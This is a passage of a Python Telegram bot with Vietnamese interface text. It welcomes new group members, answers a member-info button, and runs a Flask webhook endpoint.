        logging.error(f"Lỗi không xác định khi quay lại thông tin mail: {e}")
        bot.answer_callback_query(call.id, "⚠️ Lỗi khi quay lại thông tin mail!", show_alert=True)

pressed_info_buttons = set()

@bot.message_handler(content_types=['new_chat_members'])
def duongcongbangdev_welcome(message):
    for member in message.new_chat_members:
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("🧑‍💻 Admin", url="t.me/zproject2"),
            InlineKeyboardButton("📢 Group Thông Báo", url=REQUIRED_GROUP_LINK)
        )
        markup.add(
            InlineKeyboardButton("💬 Group Chat Chính", url="https://t.me/zproject4"),
            InlineKeyboardButton("ℹ️ Thông Tin Của Bạn", callback_data=f"user_info_{member.id}")
        )
        
        video = random.choice(["https://i.pinimg.com/originals/ff/81/de/ff81dee1dcdd40d560569fe2ae94b6d3.gif"])
        
        welcome = (
            f"<blockquote><code>❖ 🎉 ZprojectX Bot Welcome 🎉 ❖</code></blockquote>\n\n"
            f"<blockquote><i>✡ Xin Chào 👋!</i> <a href='tg://user?id={member.id}'>{member.first_name}</a></blockquote>\n"
            f"<blockquote><b>➩ Đã Tham Gia Nhóm: <b>{message.chat.title}</b></b></blockquote>\n"
            f"<blockquote><i>➩ Số thành viên hiện tại: {bot.get_chat_members_count(message.chat.id)}</i></blockquote>\n"
            "<blockquote><i>▣ Dùng /help để xem all lệnh của bot</i></blockquote>\n"
            "<blockquote><code>▣ Dùng /phanhoi nội dung | Để Gửi Phản Hồi Lỗi Hoặc Chức Năng Cần Cải Tiến!</code></blockquote>\n"
        )
        
        bot.send_video(
            message.chat.id,
            video=video,
            caption=welcome,
            reply_to_message_id=message.message_id,
            supports_streaming=True,
            parse_mode='HTML',
            reply_markup=markup
        )

@bot.callback_query_handler(func=lambda call: True)
def duongcongbangdev_handle_callback(call):
    if call.data.startswith("user_info_"):
        user_id = int(call.data.split("_")[2])
        message_id = call.message.message_id

        if (message_id, user_id) in pressed_info_buttons:
            bot.answer_callback_query(call.id, "Bạn Đã Xem Rồi Còn Có Ý Định Spam Thì Tuổi Nhé!", show_alert=True)
            return

        pressed_info_buttons.add((message_id, user_id))

        try:
            member_info = bot.get_chat_member(call.message.chat.id, user_id)
            user = member_info.user
            
            user_info_message = (
                f"<i>✨ Thông Tin Thành Viên ✨</i>\n\n"
                f"👤 Tên: {user.first_name} {user.last_name if user.last_name else ''}\n"
                f"🆔 ID: `{user.id}`\n"
                f"👋 Username: @{user.username}\n" if user.username else f"👋 Username: Không có\n"
                f"🔗 Link Profile: [Xem Profile](tg://user?id={user.id})\n"
                f"🌟 Là Bot: {'Có' if user.is_bot else 'Không'}\n"
                f"📈 Trạng Thái Trong Nhóm: {member_info.status.capitalize()}\n"
                f"🗓️ Thời Gian Tham Gia: {member_info.until_date if member_info.until_date else 'Không xác định'}\n"
            )
            bot.send_message(call.message.chat.id, user_info_message, parse_mode='HTML')
            bot.answer_callback_query(call.id, "Thông tin đã được gửi!")
            
        except Exception as e:
            bot.answer_callback_query(call.id, f"Không thể lấy thông tin: {e}", show_alert=True)

# === Webhook Flask ===
@app.route("/")
def index():
    return "<h3>🛰️ ZProject Bot đang hoạt động!</h3>"

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    try:
        update = telebot.types.Update.de_json(request.data.decode("utf-8"))
        bot.process_new_updates([update])
        return "OK", 200
    except Exception as e:
        logging.error(f"Lỗi webhook: {e}")
        return "Error", 500

if __name__ == "__main__":
    try:
        webhook_info = bot.get_webhook_info()
        current_webhook_url = f"{APP_URL}/{TOKEN}"
        if webhook_info.url != current_webhook_url:
            logging.info(f"Webhook hiện tại ({webhook_info.url}) không khớp với URL mong muốn ({current_webhook_url}). Đang xóa và đặt lại webhook.")
            bot.remove_webhook()
            time.sleep(1)
            bot.set_webhook(url=current_webhook_url)
            logging.info(f"Webhook đã được đặt tới: {current_webhook_url}")
        else:
            logging.info(f"Webhook đã được đặt chính xác tới: {current_webhook_url}")

        port = int(os.environ.get("PORT", 10000))
        app.run(host="0.0.0.0", port=port)
    except Exception as e:
        logging.critical(f"Lỗi nghiêm trọng khi khởi động bot: {e}")

